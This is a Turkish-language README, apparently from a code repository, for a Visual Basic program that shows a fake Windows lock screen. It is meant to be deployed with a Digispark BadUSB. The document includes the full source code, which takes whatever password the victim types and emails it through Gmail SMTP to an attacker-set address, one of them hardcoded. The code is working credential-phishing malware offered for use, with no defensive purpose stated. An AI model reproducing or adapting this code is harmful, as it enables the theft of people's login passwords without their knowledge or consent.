# WindowsFakeLockScreen
<img src="https://i.hizliresim.com/Ii5hUx.png">

Üst kısımdaki resimden de anlayacağınız gibi sahte bir login ekranıdır.
programı visual basic ile oluşturdum.
Mantık programda textbox kısmına girilen herhangi bir yazıyı belirlediğimiz mail adresine göndermektir.
Bu programı BadUSB ile birlikte kullanmak amaçlı oluşturdum ve BadUSB olarak Digispark kullandım.

Digispark ile ilgli bilgiye ulaşmak için: https://digistump.com/wiki/digispark bu adrese bakın

Sahte görüntü tamamen bir görseldir sadece TextBox ve Button olan kısım eklenmiştir butonun daha gerçekçi gözükmesi için PictureBox olarak ayarladım.

Programı Visual Studio 2013 Ultimate kullanarak hazırladım

<strong>PROGRAMIN KAYNAK KODU</strong>

<pre><code>Imports System.Net.Mail
Public Class Form1

    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub PictureBox3_Click(sender As System.Object, e As System.EventArgs) Handles PictureBox3.Click
        Dim MyMailMessage As New MailMessage()

            Try
                MyMailMessage.From = New MailAddress("MAILADRESI@gmail.com")
                MyMailMessage.To.Add("sefaorucsiberdunya@gmail.com")
                MyMailMessage.Subject = TextBox1.Text
                MyMailMessage.Body = TextBox2.Text
                Dim SMTP As New SmtpClient("smtp.gmail.com")
                SMTP.Port = 587
                SMTP.EnableSsl = True
                SMTP.Credentials = New System.Net.NetworkCredential("MAILADRESI@gmail.com", "PAROLA")
                SMTP.Send(MyMailMessage)
                TextBox2.Text = ""
                Dim frm As New Form1
                frm.Show()

                Me.Close()
            Catch ex As Exception
            End Try
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            Dim MyMailMessage As New MailMessage()
            MyMailMessage.From = New MailAddress("MAILADRESI@gmail.com")
            MyMailMessage.To.Add("MAILADRESI@gmail.com")
            MyMailMessage.Subject = TextBox1.Text
            MyMailMessage.Body = TextBox2.Text
            Dim SMTP As New SmtpClient("smtp.gmail.com")
            SMTP.Port = 587
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential("MAILADRESI@gmail.com", "POROLA")
            SMTP.Send(MyMailMessage)
            TextBox2.Text = ""
            Dim frm As New Form1
            frm.Show()

            Me.Close()

        End If
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged


    End Sub

End Class
</code></pre>

Kaynak kodlardan da görebileceğiniz gibi oldukça basit bir kodlamadır.
kodları ikinci defa yazmamın sebebi girilen texti hem enter tuşuna bastığında hem de ekrandaki ok işaretine bastığı zaman belirlediğimiz mail adresine göndermesi içindir.



